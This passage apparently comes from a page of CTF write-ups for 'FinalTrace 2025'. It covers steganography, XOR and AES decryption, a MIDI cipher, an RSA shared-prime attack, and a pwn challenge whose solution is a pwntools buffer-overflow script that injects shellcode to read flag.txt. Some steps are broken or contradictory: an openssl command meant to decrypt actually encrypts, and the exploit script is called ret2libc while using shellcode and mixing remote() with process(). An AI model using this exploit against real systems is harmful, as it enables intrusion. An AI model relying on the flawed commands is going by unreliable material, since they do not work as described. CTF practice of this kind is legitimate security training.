            <span class="kn">import</span> <span class="n">binascii</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">HEX:</span><span class="sh">"</span><span class="p">,</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">b</span><span class="p">).</span><span class="nf">decode</span><span class="p">())</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></table></code></div></div><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{B43aking_th3_m1rr0r_1$_c00l}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{B43aking_th3_m1rr0r_1$_c00l} </code><hr><h1 id="echoes-in-the-hourglass"> Echoes in the Hourglass <a href="/writeups/FinalTrace_2025/16-unknown-challenge.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><ul><li><strong>Author</strong>: Vishal V</ul><p>Challenge Description An hourglass image from the Citadel’s archives hides the encryption key to twelve lost timeline fragments (timeline_grain_*.bin). Each fragment carries a piece of the Citadel’s final chronicle. Recover the cipher key, decrypt all fragments, and rebuild the temporal log to restore the flow of time — and uncover the last message trapped within.</p><p>Solution</p><p>Solution Summary (Internal Dev Notes):</p><p>1.Extract stego data → recover cipher_key.bin. 2.Decrypt fragments using the provided XOR script. 3.Decrypt the timestamp log via openssl aes-256-cbc. 4.Reassemble the decrypted fragments in chronological order. 5.The flag appears in one fragment: timeline_grain_autd.txt.</p><p>Initial Analysis I listed the archive contents, inspected the image for hidden data, and examined the provided scripts. The image looked like a likely steganography container and the repository included a small XOR script (scripts/temporal_cipher.py) which suggested an XOR-based encryption of the fragments. There was also a timestamp_log.enc that was encrypted using openssl. A Hint.txt was also present having some necessary passwords which where md5 hashed.</p><p>Tools Used • steghide (to inspect/extract data from the image) • python3 (to run scripts/temporal_cipher.py) • Online md5 decrypting tools</p><p>Step-by-Step Solution</p><p>Step 1: Unpack and inspect unzip citadel_memory_dump.zip ls -lah file hourglass_of_time.jpg steghide info hourglass_of_time.jpg I confirmed the hourglass_of_time.jpg contains embedded data(cipher_key.bin) with steghide info. The passkey(echoes) for steghide was hidden in the hint.txt which could be broken using online md5 decrypting tools.</p><p>Step 2: Extract the cipher key from the image steghide extract -sf hourglass_of_time.jpg -p echoes -xf cipher_key.bin Using the steghide password (echoes), I extracted cipher_key.bin. This key is required to XOR-decrypt the timeline grains.</p><p>Step 3: Decrypt one fragment (smoke test) chmod +x scripts/temporal_cipher.py ./scripts/temporal_cipher.py timeline_grain_ 3w@e.bin cipher_key.bin grain_ 3w@e.txt This validated the key and script: the output showed readable part of the temporal log. Step 4: Decrypt all fragments for b in *.bin; do ./scripts/temporal_cipher.py “$b” cipher_key.bin “${b%.bin}.txt” done Each fragment decrypted into a .txt file.</p><p>Step 5: Decrypt the timestamp_log.enc file timestamp_log.enc output: timestamp_log.enc: openssl enc’d data with salted password This makes it clear that the file was encrypted using openssl. The password can be taken from hint.txt. The most common encryption in openssl is aes-256 hence try decrypting by that: openssl enc -aes-256-cbc -pbkdf2 -salt -in timestamp_log.txt -out timestamp_log.enc -pass pass:password Decrypted file stored as timestamp_log.txt</p><p>Step 6: Reconstruct the full log With reference to timestamp_log.txt reconstruct each file fragment. Concatenating the decrypted fragments in timestamp order reconstructed the original temporal log.</p><p>Step 7: Extract the flag The flag is present in the final temporal log. Note: the flag is present in only one of the file fragments: timeline_grain_autd.txt, so instead of concatenating based on timestamp_log.txt the player may individually open all the 12 files to find the flag. Either way this makes this challenge time consuming. There are also 2 decoy files that are present only to confuse the player: corrupted_grain_xx.bin,memory_alpha.txt.</p><p>Flag: FLAG{HOURGLASS_RECOVERED}</p><h2> Flag</h2><code> FLAG{HOURGLASS_RECOVERED} </code><hr><h1 id="temporal-freeze-upgrade"> Temporal Freeze Upgrade <a href="/writeups/FinalTrace_2025/17-ctf-27-temporal-freeze-upgrade-walkthrough.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="temporal-freeze-upgrade">Temporal Freeze Upgrade</h1><h2 id="objective"><span class="mr-2">Objective</span><a href="#objective" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Solve the mirror puzzle to decrypt the flag: <code class="language-plaintext highlighter-rouge">cys{T1M3_SYNC}</code></p><hr /><h2 id="step-1-understand-the-mirrors"><span class="mr-2">Step 1: Understand the Mirrors</span><a href="#step-1-understand-the-mirrors" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You have 4 mirrors to select in the correct order:</p><ul><li>Mirror 0 (◈) - 0x00<li>Mirror 1 (◉) - 0x01<li>Mirror 2 (◊) - 0x02<li>Mirror 3 (◆) - 0x03</ul><hr /><h2 id="step-2-find-the-pattern"><span class="mr-2">Step 2: Find the Pattern</span><a href="#step-2-find-the-pattern" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Look at the <strong>QUANTUM_STATE_DECAY</strong> values:</p><ul><li>Mirror 0: Decay = 5<li>Mirror 1: Decay = 8<li>Mirror 2: Decay = 3<li>Mirror 3: Decay = 6</ul><p><strong>Key Insight:</strong> Order mirrors by lowest to highest dec ay value.</p><hr /><h2 id="step-3-correct-sequence"><span class="mr-2">Step 3: Correct Sequence</span><a href="#step-3-correct-sequence" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Click mirrors in this order:</p><ol><li><strong>Mirror 2</strong> (◊) - Decay 3<li><strong>Mirror 0</strong> (◈) - Decay 5<li><strong>Mirror 3</strong> (◆) - Decay 6<li><strong>Mirror 1</strong> (◉) - Decay 8</ol><hr /><h2 id="step-4-get-the-encrypted-flag"><span class="mr-2">Step 4: Get the Encrypted Flag</span><a href="#step-4-get-the-encrypted-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When solved correctly, you’ll see:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>DECRYPTION_KEY: [encrypted characters]
</pre></table></code></div></div><p>Copy this encrypted string.</p><hr /><h2 id="step-5-decrypt-the-flag"><span class="mr-2">Step 5: Decrypt the Flag</span><a href="#step-5-decrypt-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Open <strong>Browser Console (F12)</strong> and paste:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">encryptedFlag</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">[PASTE_YOUR_ENCRYPTED_KEY_HERE]</span><span class="dl">"</span><span class="p">;</span>

<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">offset</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">offset</span> <span class="o">&lt;=</span> <span class="mi">50</span><span class="p">;</span> <span class="nx">offset</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">decrypted</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">encryptedFlag</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">decrypted</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">encryptedFlag</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">-</span> <span class="nx">offset</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="k">if </span><span class="p">(</span><span class="nx">decrypted</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">'</span><span class="s1">cys{</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Flag: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">decrypted</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><hr /><h2 id="step-6-submit-flag"><span class="mr-2">Step 6: Submit Flag</span><a href="#step-6-submit-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The decrypted flag will appear in console:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cys{T1M3_SYNC}
</pre></table></code></div></div><hr /><h2 id="tips"><span class="mr-2">Tips</span><a href="#tips" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Use <strong>ANALYZE</strong> button for hints if stuck<li>Watch <strong>TEMPORAL_ALIGNMENT</strong> section as you select<li>The <strong>decay values are the key</strong> to solving it<li>Wrong sequence resets after 3 seconds<li>Each solve generates a unique encrypted flag</ul><hr /><h2 id="quick-reference"><span class="mr-2">Quick Reference</span><a href="#quick-reference" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>| Position | Mirror | Symbol | Decay | |———-|——–|——–|——-| | 1st | 2 | ◊ | 3 | | 2nd | 0 | ◈ | 5 | | 3rd | 3 | ◆ | 6 | | 4th | 1 | ◉ | 8 |</p><h2> Flag</h2><code> cys{T1M3_SYNC} </code><hr><h1 id="lyra-s-photos"> Lyra's Photos <a href="/writeups/FinalTrace_2025/18-lyras-photos.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="lyras-photos"><span class="mr-2">Lyra’s Photos</span><a href="#lyras-photos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: Forensics<li><strong>Author</strong>: Aadhyanth</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Hark, seeker of secrets! Before thee lies not cold stone, but the scattered remnants of a life lived, perhaps loved, perhaps lost. Six timeworn likenesses, captured by the enigmatic Lyra, lay strewn upon the dusty floor of this forgotten chamber. They say Lyra possessed the sight, able to bind not just light, but feeling, into her creations.</p><p>Each portrait – a frozen moment of joy, sorrow, anger, fear, surprise, or contemplation – pulses with a faint, spectral energy. Within the very weave of these images, Lyra concealed fragments of a greater truth, echoes of the heart bound to the canvas.</p><p>Thy task, should thou possess the keen eye and sharper wit, is to delve into the hidden layers of each depiction. Uncover the six fragments of data, each resonating with the soul of the emotion it guards. Only by piecing together these spectral whispers can the full secret be unveiled. Tread carefully, for memories, like ghosts, oft cling tightly to their resting place.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This challenge consists of 6 separate image files. Each image contains one part of the flag, hidden at a random location.</p><p>Extraction hints (for stegsolve):</p><ul><li>image_1_red.png: Channels -&gt; Red ; Bitplanes -&gt; 0<li>image_2_yellow.png: Channels -&gt; Green ; Bitplanes -&gt; 0<li>image_3_green.png: Channels -&gt; Blue ; Bitplanes -&gt; 0<li>image_4_blue.png: Channels -&gt; Red ; Bitplanes -&gt; 4<li>image_5_black.png: Channels -&gt; Green ; Bitplanes -&gt; 4<li>image_6_white.png: Channels -&gt; Blue ; Bitplanes -&gt; 4</ul><p>Alternatively, using a random colormap usually works for all 6 images</p><p>Parts: Part 1: “CYS{f” Part 2: “1v3<em>5” Part 3: “3n535” Part 4: “_s1x</em>” Part 5: “3m0t1” Part 6: “0n5}”</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Stegsolve</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1"><span class="mr-2">Step 1:</span><a href="#step-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>java -jar Stegsolve.jar
</pre></table></code></div></div><p>Opens stegsolve</p><h4 id="step-2"><span class="mr-2">Step 2:</span><a href="#step-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Use the arrows to find the correct setting</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{f1v3_53n535_s1x_3m0t10n5}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{f1v3_53n535_s1x_3m0t10n5} </code><hr><h1 id="paradox-gate-gaurdian"> PARADOX GATE GAURDIAN <a href="/writeups/FinalTrace_2025/19-paradox-gate-gaurdian.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><hr /><h2 id="paradox-gate-gaurdian"><span class="mr-2">PARADOX GATE GAURDIAN</span><a href="#paradox-gate-gaurdian" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: [Crypto]<li><strong>Author</strong>: [Anandhita Akhileshwaran(Ariza/anu akhil)]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The “Paradox Gate Guardian” challenge combined steganography and RSA cryptography. Players had to extract a hidden Pastebin link from an image through multiple layers of encoding and then recover the flag from a weak RSA encryption setup. Solution:</p><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The image contained a hidden string, which was not human-readable. Using an online steganography tool (Edchart) revealed the string inside the image. The string appeared to be multi-layer encoded (Base32 → Base58 → Base64), which indicated that several decoding steps were needed to get the actual Pastebin link.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Edchart – for extracting hidden string from image(Steganography)<li>Online Base32/Base58/Base64 converters – for decoding each layer<li>Python (online compiler) – for decrypting the RSA message</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-extract-hidden-string-from-image"><span class="mr-2">Step 1: Extract hidden string from image</span><a href="#step-1-extract-hidden-string-from-image" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Used Edchart online tool to decode hidden string from gate_stego.png hidden_string = extract_from_image(“gate_stego.png”) # done online The extracted string was in Base32, revealing another encoded string after decoding.</p><h4 id="step-2-decode-successive-layers-to-get-pastebin-link"><span class="mr-2">Step 2: Decode successive layers to get Pastebin link</span><a href="#step-2-decode-successive-layers-to-get-pastebin-link" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Base32 → Base58 → Base64, all using online converters hidden_base32 = decode_base32(hidden_string) # online tool hidden_base58 = decode_base58(hidden_base32) # online tool pastebin_link_bytes = decode_base64(hidden_base58) # online tool pastebin_link = pastebin_link_bytes.decode() print(pastebin_link) After decoding, the Pastebin link appeared: https://pastebin.com/WrmVZ5Dh</p><p>This Pastebin contained the public.txt file with the RSA parameters:</p><ol><li>challenge: Paradox gate gaurdian<li>note: Two gates encrypt the same message. Recover the flag.<li>n1 = 15033578721439194988387179123854233894267575851240227576895496309506779750811590181996000973958811554416086988499492871175810679952478996274497198120963437989391636776502564411733778651880050934455369891966390586105142302383763131276917257610586999218429760875606433602994834838769089475278168103214389863284197728391195033697151334759565568924671759303271692600650009783080454557955626253866173440609692903558021152495564623502947058911525245202105707967579681530057950438396498842868456213925367642445573908267262206078459611761317395331888167006784457049353131120218969698496710227657739733468945914312493706698413<li>n2 = 16994203338805397319400272058724146051502286151707007457101473255345953782170696536631265860021364475381819700444652919177539962950188092468598324885891882673731931581635415757055762743880126185343173816349139258908988088539519778409328371684839124913307562496045782999069227820366923748378092435370991558505739627586598732619112281521624236544378255527298348829479184612892706572963496922151338558476196809568338515399774528241198625809347603007190842549728974057953253554368551262921187839455170370165407169059886861059987495953267026039920025021152304913810807950398619398857701291727584481688042625083522549008367<li>e = 65537<li>c1 = 13359592783646666829124790216940920600108500335065136879423044095415962773244362668029844057063039053334386493742236153067934817228155212597146941588684123958884529086497398545650534506756212950456793154677111988173725366510534477388750863477728159418089135584136696512663516920841636352796735706734976668573001643435302538446161441508036338843236636456593111870038926248726639580335090513080916216378021236432485331721569623895390309355945576242090957647984587151208534535113112782983715119031375384841320157827177252620161003120386128309678359212762486965447628253829072242579655033891210972578584241367112075733422<li>c2 = 14894363247019487835828355276465975866394899053117215785498335536076946429595510278243964416072837958824125854177698119068383498399350861277724922394422808992575888021137547426446478873603858083070094375486944492274127707059533273947707574615998776561977754206041031600695914710691752488594429809822626171728562271904217925687390029259147146667052337759099154641812430003020041060691800682850742498055579821126286418498116970776515025226838153691877013893184632680088496097144260482894116776541453917344794158788235304567868269675115656351298895842895028198495523839679949384177266537019541693949055511457364024881337</ol><h4 id="step-3-analyze-rsa-encryption"><span class="mr-2">Step 3: Analyze RSA encryption</span><a href="#step-3-analyze-rsa-encryption" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>from math import gcd</p><h5 id="step-3a-find-shared-prime"><span class="mr-2">Step 3a: Find shared prime</span><a href="#step-3a-find-shared-prime" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>p = gcd(n1, n2)</p><h5 id="step-3b-compute-corresponding-q1"><span class="mr-2">Step 3b: Compute corresponding q1</span><a href="#step-3b-compute-corresponding-q1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>q1 = n1 // p</p><h5 id="step-3c-compute-private-key"><span class="mr-2">Step 3c: Compute private key</span><a href="#step-3c-compute-private-key" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>phi1 = (p - 1) * (q1 - 1) d1 = pow(e, -1, phi1)</p><h5 id="step-3d-decrypt-ciphertext-c1"><span class="mr-2">Step 3d: Decrypt ciphertext c1</span><a href="#step-3d-decrypt-ciphertext-c1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>m = pow(c1, d1, n1)</p><h5 id="step-3e-convert-integer-message-to-bytes"><span class="mr-2">Step 3e: Convert integer message to bytes</span><a href="#step-3e-convert-integer-message-to-bytes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>msg = m.to_bytes((m.bit_length() + 7) // 8, ‘big’) print(msg.decode())</p><p>Explanation: The RSA was vulnerable because n1 and n2 shared a common prime factor p. Using gcd(n1, n2) revealed p. Once p was known, we computed q1 = n1 // p and the private exponent d1. Decrypting c1 gave the flag. Note: c2 exists but was not needed to recover the flag. It could be decrypted using q2 = n2 // p as a verification step, but c1 alone suffices. <strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><em>__</em></p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>CYS{4CC355<em>6RAN73D} <strong>__</strong></em><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong>___</p><h2> Flag</h2><code> CYS{4CC355_6RAN73D} </code><hr><h1 id="where-do-u-came-from"> Where do u came from <a href="/writeups/FinalTrace_2025/20-where-do-u-came-from.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="where-do-u-came-from"><span class="mr-2">Where do u came from</span><a href="#where-do-u-came-from" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><p><strong>Category</strong>: Pwn</p><li><p><strong>Author</strong>: Kirubahari</p></ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Ret2libc attack</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="steps"><span class="mr-2">Steps</span><a href="#steps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Finding the right offset using <code class="language-plaintext highlighter-rouge">dbg</code> in cyclic mode which gives the correct offset</p><p>The return address is given the binary itself.</p><p>Combining that both helps in exploiting</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><p>gdb</p><li><p>python</p></ul><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>
<span class="c1">#! /usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="err">“</span><span class="n">IP</span><span class="err">“</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">()</span>

<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">)</span>

<span class="n">addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">cat</span><span class="p">(</span><span class="sh">"</span><span class="s">flag.txt</span><span class="sh">"</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="nf">cyclic</span><span class="p">(</span><span class="mi">136</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

</pre></table></code></div></div><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>
FLAG{ret2libc}

</pre></table></code></div></div><h2> Flag</h2><code> Dynamic Flag </code><hr><h1 id="symphony-of-loops"> Symphony of Loops <a href="/writeups/FinalTrace_2025/21-symphony-of-loops.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="symphony-of-loops"><span class="mr-2">Symphony of Loops</span><a href="#symphony-of-loops" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: Musical Cipher<li><strong>Author</strong>: Aadhyanth</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Bard’s Enigma: Symphony of Loops</p><p>Attend, O seeker of hidden verse! Before thee resonates a spectral melody, an artifact known only as the “Symphony of Loops.” Legend tells of a mad court composer, Elmsworth, who claimed to have transcribed the very song of the Aether – a haunting refrain caught in an endless, maddening cycle.</p><p>Dismissed as a lunatic, Elmsworth vanished, leaving behind only this enchanted score, captured not on parchment, but within this peculiar digital phial (a MIDI file, they call it in lesser realms). It is said that Elmsworth encoded his final, defiant truth within the music itself, believing only a mind attuned to both harmony and cipher could unravel it.</p><p>Listen closely to the repeating bars. Observe the dance of the notes upon the unseen staff. Within this loop, each key press, each rise and fall in tone, is no mere sound – it is a symbol, a letter in a forgotten alphabet where music itself forms the words.</p><p>Thy task is to break the cycle, to listen beyond the melody and perceive the message woven into its very structure. Decipher the notes, translate their hidden meaning, and reveal the secret Elmsworth entrusted to his looping symphony. But take heed – madness oft lies within such endless refrains.</p><p>Make sure to wrap thy message in CYS{…}</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>MIDI file viewer<li>A notebook and pen</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1"><span class="mr-2">Step 1:</span><a href="#step-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Open the .mid file with any midi file viewer (ex. https://signalmidi.app/edit)</p><h4 id="step-2"><span class="mr-2">Step 2:</span><a href="#step-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Note down the sequence of piano keys from the viewer in the correct order D#6, D#4, D7, C#4, F#6, B7, G#5, C#7, A#6, E4, F#6, C7, B7, F6, C#4, G#5, G#5, C#4, D#4, B7, B5, E4, F6, D#4 is the obtained sequence</p><h4 id="step-3"><span class="mr-2">Step 3:</span><a href="#step-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The keys are numbered from a transpose of the standard MIDI indexing system. Instead of assigning the value of 60 to C4, the value of 0 has been assigned to C0. (This is apparent from the repeating B7 keys, which can be inferred to be underscores) The number of each key represents an ASCII value.</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{K3V1N_DUR4NT_M1DD13_G4M3}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{K3V1N_DUR4NT_M1DD13_G4M3} </code><hr><h1 id="ashes-of-memory"> Ashes of Memory <a href="/writeups/FinalTrace_2025/22-ashes-of-memory.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="ashes-of-memory">Ashes of Memory</h1><ul><li><strong>Category</strong>: [Forensics]<li><strong>Author</strong>: [ace6002]<li><strong>Level</strong>: [Easy]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Image stegseek reveals binary, decoding binary gives flag.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>[Stegseek]<li>[Python to group binary by 7 bits and decode]</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 